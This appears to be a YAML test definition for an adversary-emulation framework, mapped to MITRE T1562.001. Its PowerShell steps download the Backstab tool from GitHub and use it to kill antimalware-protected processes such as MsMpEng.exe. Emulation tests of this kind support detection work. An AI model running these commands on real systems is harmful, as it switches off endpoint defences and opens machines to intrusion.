api_version: "2.0"
name: Kill antimalware protected processes using Backstab
description: |-
    Backstab loads Process Explorer driver which is signed by Microsoft and use it to terminate running processes protected by antimalware software such as MsSense.exe or MsMpEng.exe, which is otherwise not possible to kill.
    https://github.com/Yaxser/Backstab
args:
    - name: process_name
      type: string
      default: MsMpEng.exe
uuid: 24a12b91-05a7-4deb-8d7f-035fa98591bc
mitre:
    tactics:
        - 'TA0005: Defense Evasion'
    techniques:
        - 'T1562: Impair Defenses'
    subtechniques:
        - 'T1562.001: Disable or Modify Tools'
requirements:
    platforms:
        - os: windows
steps:
    - name: Backstab64.exe should exist in ExtrnalPayloads Directory
      inline: |-
        if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe") {exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
        Invoke-WebRequest "https://github.com/Yaxser/Backstab/releases/download/v1.0.1-beta/Backstab64.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe"
        }}
      executor: powershell
    - name: kill-antimalware-protected-processes-using-backstab
      inline: |
        & "PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe" -k -n {{.Args.process_name}}
      executor: powershell
      cleanup:
        inline: ""
        executor: powershell
